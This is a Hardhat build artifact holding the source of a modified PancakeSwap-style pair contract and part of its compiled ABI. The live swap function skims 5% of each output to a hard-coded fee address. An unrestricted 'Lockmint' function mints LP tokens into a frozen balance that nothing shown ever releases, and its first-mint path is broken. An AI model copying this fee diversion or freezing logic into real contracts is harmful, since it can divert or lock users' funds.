{
	"id": "6d9e1e55853e8f3334be87f7a10de944",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.5.16",
	"solcLongVersion": "0.5.16+commit.9c3226ce",
	"input": {
		"language": "Solidity",
		"sources": {
			"src/Pair.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\nimport \"./IPair.sol\";\nimport \"./ERC20.sol\";\nimport \"./Math.sol\";\nimport \"./UQ112x112.sol\";\nimport \"./IERC20.sol\";\nimport \"./IFactory.sol\";\nimport \"./ICallee.sol\";\n\ncontract Pair is IPair, ERC20 {\n    using SafeMath for uint;\n    using UQ112x112 for uint224;\n\n    address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c;\n\n    uint public constant MINIMUM_LIQUIDITY = 10 ** 3;\n    bytes4 private constant SELECTOR =\n        bytes4(keccak256(bytes(\"transfer(address,uint256)\")));\n\n    address public factory;\n    address public token0;\n    address public token1;\n    uint public taxfee;\n\n    uint112 private reserve0; // uses single storage slot, accessible via getReserves\n    uint112 private reserve1; // uses single storage slot, accessible via getReserves\n    uint32 private blockTimestampLast; // uses single storage slot, accessible via getReserves\n\n    uint public price0CumulativeLast;\n    uint public price1CumulativeLast;\n    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n\n    uint private unlocked = 1;\n    modifier lock() {\n        require(unlocked == 1, \"Pancake: LOCKED\");\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n\n    function getReserves()\n        public\n        view\n        returns (\n            uint112 _reserve0,\n            uint112 _reserve1,\n            uint32 _blockTimestampLast\n        )\n    {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n\n    function _safeTransfer(address token, address to, uint value) private {\n        (bool success, bytes memory data) = token.call(\n            abi.encodeWithSelector(SELECTOR, to, value)\n        );\n        require(\n            success && (data.length == 0 || abi.decode(data, (bool))),\n            \"Pancake: TRANSFER_FAILED\"\n        );\n    }\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(\n        address indexed sender,\n        uint amount0,\n        uint amount1,\n        address indexed to\n    );\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    constructor() public {\n        factory = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(\n        address _token0,\n        address _token1,\n        uint _taxfee\n    ) external {\n        require(msg.sender == factory, \"Pancake: FORBIDDEN\"); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n        taxfee = _taxfee;\n    }\n\n    // update reserves and, on the first call per block, price accumulators\n    function _update(\n        uint balance0,\n        uint balance1,\n        uint112 _reserve0,\n        uint112 _reserve1\n    ) private {\n        require(\n            balance0 <= uint112(-1) && balance1 <= uint112(-1),\n            \"Pancake: OVERFLOW\"\n        );\n        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast +=\n                uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *\n                timeElapsed;\n            price1CumulativeLast +=\n                uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *\n                timeElapsed;\n        }\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    }\n\n    // if fee is on, mint liquidity equivalent to 8/25 of the growth in sqrt(k)\n    function _mintFee(\n        uint112 _reserve0,\n        uint112 _reserve1\n    ) private returns (bool feeOn) {\n        address feeTo = IFactory(factory).feeTo();\n        feeOn = feeTo != address(0);\n        uint _kLast = kLast; // gas savings\n        if (feeOn) {\n            if (_kLast != 0) {\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) {\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast)).mul(\n                        8\n                    );\n                    uint denominator = rootK.mul(17).add(rootKLast.mul(8));\n                    uint liquidity = numerator / denominator;\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                }\n            }\n        } else if (_kLast != 0) {\n            kLast = 0;\n        }\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(\n                amount0.mul(_totalSupply) / _reserve0,\n                amount1.mul(_totalSupply) / _reserve1\n            );\n        }\n        require(liquidity > 0, \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\");\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function Lockmint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n            freezeMint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(\n                amount0.mul(_totalSupply) / _reserve0,\n                amount1.mul(_totalSupply) / _reserve1\n            );\n        }\n        require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\");\n        freezeMint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function burn(\n        address to\n    ) external lock returns (uint amount0, uint amount1) {\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(\n            amount0 > 0 && amount1 > 0,\n            \"Pancake: INSUFFICIENT_LIQUIDITY_BURNED\"\n        );\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n\n    //og\n    // this low-level function should be called from a contract which performs important safety checks\n    /*    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock {\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out < _reserve0 && amount1Out < _reserve1,\n            \"Pancake: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint balance0;\n        uint balance1;\n        {\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\");\n            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n            if (data.length > 0)\n                IPancakeCallee(to).pancakeCall(\n                    msg.sender,\n                    amount0Out,\n                    amount1Out,\n                    data\n                );\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"Pancake: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            uint balance0Adjusted = (\n                balance0.mul(10000).sub(amount0In.mul(25))\n            );\n            uint balance1Adjusted = (\n                balance1.mul(10000).sub(amount1In.mul(25))\n            );\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint(_reserve0).mul(_reserve1).mul(10000 ** 2),\n                \"Pancake: K\"\n            );\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n*/\n    // custom\n\n    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock {\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out < _reserve0 && amount1Out < _reserve1,\n            \"Pancake: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint balance0;\n        uint balance1;\n        {\n            uint taxamount0Out = amount0Out - (amount0Out * 5) / 100;\n            uint taxamount1Out = amount1Out - (amount1Out * 5) / 100;\n\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\");\n            if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out); // optimistically transfer tokens\n            if (data.length > 0)\n                ICallee(to).pancakeCall(\n                    msg.sender,\n                    taxamount0Out, // amount0Out,\n                    taxamount1Out, //  amount1Out,\n                    data\n                );\n\n            uint tax0 = (amount0Out * 5) / 100;\n            uint tax1 = (amount1Out * 5) / 100;\n\n            if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1); // optimistically transfer tokens\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"Pancake: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            uint balance0Adjusted = (\n                balance0.mul(10000).sub(amount0In.mul(25))\n            );\n            uint balance1Adjusted = (\n                balance1.mul(10000).sub(amount1In.mul(25))\n            );\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint(_reserve0).mul(_reserve1).mul(10000 ** 2),\n                \"Pancake: K\"\n            );\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    /*  // this low-level function should be called from a contract which performs important safety checks\n    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock {\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out < _reserve0 && amount1Out < _reserve1,\n            \"UniswapV2: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint balance0;\n        uint balance1;\n\n        {\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n\n            uint taxamount0Out = amount0Out - (amount0Out * 5) / 100;\n            uint taxamount1Out = amount1Out - (amount1Out * 5) / 100;\n\n            require(to != _token0 && to != _token1, \"UniswapV2: INVALID_TO\");\n\n            if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out); // optimistically transfer tokens\n            // if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n            if (data.length > 0)\n                IPancakeCallee(to).pancakeCall(\n                    msg.sender,\n                    taxamount0Out,\n                    taxamount1Out,\n                    data\n                );\n            uint tax0 = (amount0Out * 5) / 100;\n            uint tax1 = (amount1Out * 5) / 100;\n\n            if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1); // optimistically transfer tokens\n            // _safeTransfer(_token0, FeeResiver, tax0);\n            // _safeTransfer(_token1, FeeResiver, tax1);\n\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n\n        uint amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"UniswapV2: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n             uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n              uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n              require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint(_reserve0).mul(_reserve1).mul(1000 ** 2),\n                \"UniswapV2: K\"\n            ); \n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n        // emit Swap(msg.sender, amount0In, amount1In, taxamount0Out0, taxamount1Out1, to);\n    }\n*/\n\n    // force balances to match reserves\n    function skim(address to) external lock {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(\n            _token0,\n            to,\n            IERC20(_token0).balanceOf(address(this)).sub(reserve0)\n        );\n        _safeTransfer(\n            _token1,\n            to,\n            IERC20(_token1).balanceOf(address(this)).sub(reserve1)\n        );\n    }\n\n    // force reserves to match balances\n    function sync() external lock {\n        _update(\n            IERC20(token0).balanceOf(address(this)),\n            IERC20(token1).balanceOf(address(this)),\n            reserve0,\n            reserve1\n        );\n    }\n}\n"
			},
			"src/ICallee.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface ICallee {\n    function pancakeCall(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n"
			},
			"src/IFactory.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IFactory {\n    event PairCreated(\n        address indexed token0,\n        address indexed token1,\n        address pair,\n        uint256\n    );\n\n    function feeTo() external view returns (address);\n\n    function feeToSetter() external view returns (address);\n\n    function getPair(\n        address tokenA,\n        address tokenB\n    ) external view returns (address pair);\n\n    function allPairs(uint256) external view returns (address pair);\n\n    function allPairsLength() external view returns (uint256);\n\n    function createPair(\n        address tokenA,\n        address tokenB\n    ) external returns (address pair);\n\n    function setFeeTo(address) external;\n\n    function setFeeToSetter(address) external;\n\n    function INIT_CODE_PAIR_HASH() external view returns (bytes32);\n}\n"
			},
			"src/IERC20.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IERC20 {\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external pure  returns (string memory);\n\n    function symbol() external pure returns (string memory);\n\n    function decimals() external pure returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n}\n"
			},
			"src/UQ112x112.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\n// a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format))\n\n// range: [0, 2**112 - 1]\n// resolution: 1 / 2**112\n\nlibrary UQ112x112 {\n    uint224 constant Q112 = 2 ** 112;\n\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) {\n        z = uint224(y) * Q112; // never overflows\n    }\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {\n        z = x / uint224(y);\n    }\n}\n"
			},
			"src/Math.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\n// a library for performing various math operations\n\nlibrary Math {\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = x < y ? x : y;\n    }\n\n    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\n    function sqrt(uint256 y) internal pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n}\n"
			},
			"src/ERC20.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\nimport \"./IERC20.sol\";\nimport \"./SafeMath.sol\";\n\ncontract ERC20 is IERC20 {\n    using SafeMath for uint256;\n\n    string public constant name = \"KBC LPs\";\n    string public constant symbol = \"KBC-LP\";\n    uint8 public constant decimals = 18;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    mapping(address => uint256) public _frozenBalance;\n\n    bytes32 public DOMAIN_SEPARATOR;\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n    mapping(address => uint256) public nonces;\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public {\n        uint256 chainId;\n        assembly {\n            chainId := chainid\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n    }\n\n    function _mint(address to, uint256 value) internal {\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    }\n\n    function freezeMint(\n        address account,\n        uint256 amount\n    ) internal returns (bool) {\n        // custom\n        // override\n        require(account != address(0), \"BEP20: mint to the zero address\");\n        // require(owners[msg.sender],\"only Owner freeze Token\");\n        totalSupply = totalSupply.add(amount);\n        _frozenBalance[account] = _frozenBalance[account].add(amount);\n        emit Transfer(address(0), account, amount);\n        return true;\n    }\n\n    function _burn(address from, uint256 value) internal {\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    }\n\n    function _approve(address owner, address spender, uint256 value) private {\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    function _transfer(address from, address to, uint256 value) private {\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) {\n        if (allowance[from][msg.sender] != uint256(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(\n                value\n            );\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        require(deadline >= block.timestamp, \"Pancake: EXPIRED\");\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                DOMAIN_SEPARATOR,\n                keccak256(\n                    abi.encode(\n                        PERMIT_TYPEHASH,\n                        owner,\n                        spender,\n                        value,\n                        nonces[owner]++,\n                        deadline\n                    )\n                )\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(\n            recoveredAddress != address(0) && recoveredAddress == owner,\n            \"Pancake: INVALID_SIGNATURE\"\n        );\n        _approve(owner, spender, value);\n    }\n}\n"
			},
			"src/IPair.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IPair {\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external pure returns (string memory);\n\n    function symbol() external pure returns (string memory);\n\n    function decimals() external pure returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n    event Burn(\n        address indexed sender,\n        uint256 amount0,\n        uint256 amount1,\n        address indexed to\n    );\n    event Swap(\n        address indexed sender,\n        uint256 amount0In,\n        uint256 amount1In,\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n    function factory() external view returns (address);\n\n    function token0() external view returns (address);\n\n    function token1() external view returns (address);\n\n    function getReserves()\n        external\n        view\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n\n    function price0CumulativeLast() external view returns (uint256);\n\n    function price1CumulativeLast() external view returns (uint256);\n\n    function kLast() external view returns (uint256);\n\n    function mint(address to) external returns (uint256 liquidity);\n\n    function Lockmint(address to) external returns (uint256 liquidity); // custom\n\n    function burn(\n        address to\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n\n    function skim(address to) external;\n\n    function sync() external;\n\n    function initialize(address, address, uint) external; // custom\n}\n"
			},
			"src/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0 <0.7.0;\n\n// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)\n\nlibrary SafeMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) >= x, \"ds-math-add-overflow\");\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) <= x, \"ds-math-sub-underflow\");\n    }\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": true,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"src/ERC20.sol": {
				"ERC20": {
					"abi": [
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "_frozenBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
